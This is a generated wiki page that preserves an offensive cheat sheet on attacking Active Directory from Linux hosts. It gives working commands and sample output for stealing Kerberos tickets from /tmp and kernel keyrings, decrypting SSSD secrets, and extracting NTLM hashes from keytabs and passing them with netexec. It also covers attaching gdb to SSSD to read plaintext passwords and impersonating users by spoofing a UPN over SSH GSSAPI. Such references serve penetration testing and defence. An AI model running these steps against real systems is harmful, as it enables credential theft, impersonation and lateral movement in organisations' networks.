---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Linux

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adds-linux` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-linux.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Linux](../../topics/active-directory/active-directory-linux.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adds-linux |
| name | Active Directory - Linux |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adds-linux.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Linux\n\n## CCACHE ticket reuse from /tmp\n\n> When tickets are set to be stored as a file on\
  \ disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials.\
  \ These files are typically stored in /tmp and scoped with 600 permissions\n\nList the current ticket used for authentication\
  \ with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable\
  \ with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID.\n\
  \n```powershell\n$ ls /tmp/ | grep krb5cc\nkrb5cc_1000\nkrb5cc_1569901113\nkrb5cc_1569901115\n\n$ export KRB5CCNAME=/tmp/krb5cc_1569901115\n\
  ```\n\n## CCACHE ticket reuse from keyring\n\nTool to extract Kerberos tickets from Linux kernel keys : <https://github.com/TarlogicSecurity/tickey>\n\
  \n```powershell\n# Configuration and build\ngit clone https://github.com/TarlogicSecurity/tickey\ncd tickey/tickey\nmake\
  \ CONF=Release\n\n[root@Lab-LSV01 /]# /tmp/tickey -i\n[*] krb5 ccache_name = KEYRING:session:sess_%{uid}\n[+] root detected,\
  \ so... DUMP ALL THE TICKETS!!\n[*] Trying to inject in tarlogic[1000] session...\n[+] Successful injection at process 25723\
  \ of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache\n[*] Trying to inject in velociraptor[1120601115] session...\n\
  [+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache\n\
  [*] Trying to inject in trex[1120601113] session...\n[+] Successful injection at process 25820 of trex[1120601113],look\
  \ for tickets in /tmp/__krb_1120601113.ccache\n[X] [uid:0] Error retrieving tickets\n```\n\n## CCACHE ticket reuse from\
  \ SSSD KCM\n\nSystem Security Services Daemon (SSSD) maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`.\n\
  The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`.\nBy default, the key\
  \ is only readable if you have **root** permissions.\n\nInvoking `SSSDKCMExtractor` with the --database and --key parameters\
  \ will parse the database and decrypt the secrets.\n\n```powershell\ngit clone https://github.com/fireeye/SSSDKCMExtractor\n\
  python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey\n```\n\nThe credential cache Kerberos blob can be\
  \ converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.\n\n## CCACHE ticket reuse from keytab\n\
  \n```powershell\ngit clone https://github.com/its-a-feature/KeytabParser\npython KeytabParser.py /etc/krb5.keytab\nklist\
  \ -k /etc/krb5.keytab\n```\n\n## Extract accounts from /etc/krb5.keytab\n\nThe service keys used by services that run as\
  \ root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password,\
  \ and must be kept secure.\n\nUse [microsoft/klist](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/klist)\
  \ to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey)\
  \ is 23  is the actual NT Hash of the user.\n\n```powershell\n$ klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\\
  krb5.keytab\n[...]\n[26] Service principal: host/COMPUTER@DOMAIN\n  KVNO: 25\n  Key type: 23\n  Key: 31d6cfe0d16ae931b73c59d7e0c089c0\n\
  \  Time stamp: Oct 07,  2019 09:12:02\n[...]\n```\n\nOn Linux you can use [sosdave/KeyTabExtract](https://github.com/sosdave/KeyTabExtract):\
  \ we want RC4 HMAC hash to reuse the NLTM hash.\n\n```powershell\n$ python3 keytabextract.py krb5.keytab \n[!] No RC4-HMAC\
  \ located. Unable to extract NTLM hashes. # No luck\n[+] Keytab File successfully imported.\n        REALM : DOMAIN\n  \
  \      SERVICE PRINCIPAL : host/computer.domain\n        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky\n```\n\nOn\
  \ macOS you can use [its-a-feature/bifrost](https://github.com/its-a-feature/bifrost).\n\n```powershell\n./bifrost -action\
  \ dump -source keytab -path test\n```\n\nConnect to the machine using the account and the hash with CME.\n\n```powershell\n\
  $ netexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H \"31d6cfe0d16ae931b73c59d7e0c089c0\" -d \"DOMAIN\"\n10.XXX.XXX.XXX:445 HOSTNAME-01\
  \   [+] DOMAIN\\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  \n```\n\n## Extract accounts from /etc/sssd/sssd.conf\n\n> sss_obfuscate\
  \ converts a given password into human-unreadable format and places it into appropriate domain section of the SSSD config\
  \ file, usually located at /etc/sssd/sssd.conf\n\nThe obfuscated password is put into \"ldap_default_authtok\" parameter\
  \ of a given SSSD domain and the \"ldap_default_authtok_type\" parameter is set to \"obfuscated_password\".\n\n```ini\n\
  [sssd]\nconfig_file_version = 2\n...\n[domain/LDAP]\n...\nldap_uri = ldap://127.0.0.1\nldap_search_base = ou=People,dc=srv,dc=world\n\
  ldap_default_authtok_type = obfuscated_password\nldap_default_authtok = [BASE64_ENCODED_TOKEN]\n```\n\nDe-obfuscate the\
  \ content of the ldap_default_authtok variable with [mludvig/sss_deobfuscate](https://github.com/mludvig/sss_deobfuscate)\n\
  \n```ps1\n./sss_deobfuscate [ldap_default_authtok_base64_encoded]\n./sss_deobfuscate AAAQABagVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID\n\
  ```\n\n## Extract accounts from SSSD keyring\n\n**Requirements**:\n\n* `krb5_store_password_if_offline = True` in `/etc/sssd/sssd.conf`\n\
  \n**Exploit**:\n\nWhen `krb5_store_password_if_offline` is enabled, the AD password is stored plaintext.\n\n```ps1\n[domain/domain.local]\n\
  cache_credentials = True\nipa_domain = domain.local\nid_provider = ipa\nauth_provider = ipa\naccess_provider = ipa\nchpass_provider\
  \ = ipa\nipa_server = _srv_, server.domain.local\nkrb5_store_password_if_offline = true\n```\n\nGrab the PID of the SSSD\
  \ process and hook it in `gdb`. Then list the process keyrings.\n\n```ps1\ngdb -p <PID_OF_SSSD>\ncall system(\"keyctl show\
  \ > /tmp/output\")\n```\n\nFrom the `/tmp/output` locate the `key_id` for the user you want.\n\n```ps1\nSession Keyring\n\
  \ 237034099 --alswrv      0     0  keyring: _ses\n 689325199 --alswrv      0     0   \\_ user: user@domain.local\n```\n\n\
  Back to GDB:\n\n```ps1\ncall system(\"keyctl print 689325199 > /tmp/output\")\n```\n\n## SSH GSSAPI\n\nGSSAPI (Generic Security\
  \ Services Application Program Interface) is an API that provides security services (such as authentication) and acts as\
  \ an abstraction layer for different security mechanisms, such as Kerberos.\n\n**Requirements**:\n\n* Write permission on\
  \ **Public-Information** field\n* SSH server supporting GSSAPI authentication: [CCob/gssapi-abuse](https://github.com/CCob/gssapi-abuse)\n\
  \n    ```ps1\n    ./gssapi-abuse.py -d grandline.local enum -u username -p 'P@ssw0rd'\n    ```\n\n**Methodology**:\n\nSince\
  \ MIT Kerberos doesn't verify the PAC, controlling a domain account and altering its UPN allows us to masquerade as a different\
  \ user.\n\n* Modify the `userPrincipalName` inside the **Public-Information** field.\n\n    ```ps1\n    bloodyAD --host\
  \ \"dc1.domain.local\" -d \"domain.local\" -u 'username' -p 'P@ssw0rd' set object username userPrincipalName -v 'administrator'\
  \  \n    ```\n\n* Request a ticket with the `NT_ENTERPRISE` principal because it searches for `userPrincipalName` before\
  \ `samAccountName` in the ticket.\n\n    ```ps1\n    getTGT.py -dc-ip \"10.10.10.10\" \"domain.local\"/\"username\":'P@ssw0rd'\
  \ -principalType NT_ENTERPRISE\n    .\\Rubeus.exe asktgt /user:Administrator /password:Password /principalType:enterprise\n\
  \    ```\n\n* Edit `/etc/krb5.conf` to authenticate to the Linux host via GSSAPI.\n\n    ```yaml\n    [libdefaults]\n  \
  \      default_realm = DOMAIN.LOCAL\n\n    [realms]\n        DOMAIN.LOCAL = {\n                kdc = dc1.domain.local\n\
  \        }\n\n    [domain_realm]\n        .domain.local = DOMAIN.LOCAL\n        domain.local = DOMAIN.LOCAL\n    ```\n\n\
  * SSH connection\n\n    ```ps1\n    export KRB5CCNAME=username.ccache\n    ssh -vv -K username@domain.local@linux.domain.local\n\
  \    ```\n\n## References\n\n* [20.4. Caching Kerberos Passwords - Red Hat Customer Portal](https://access.redhat.com/documentation/fr-fr/red_hat_enterprise_linux/6/html/identity_management_guide/kerberos-pwd-cache)\n\
  * [A broken marriage. Abusing mixed vendor Kerberos stacks - Ceri Coburn - August 25, 2023](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/?ref=rayanle.cat)\n\
  * [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)\n\
  * [Hack'in 2025 - One Directory - rayanlecat - June 25, 2025](https://www.rayanle.cat/hackin-2025-one-directory/)\n* [Kerberos\
  \ Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)"
_relative_path: active-directory/ad-adds-linux.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-linux.md
````
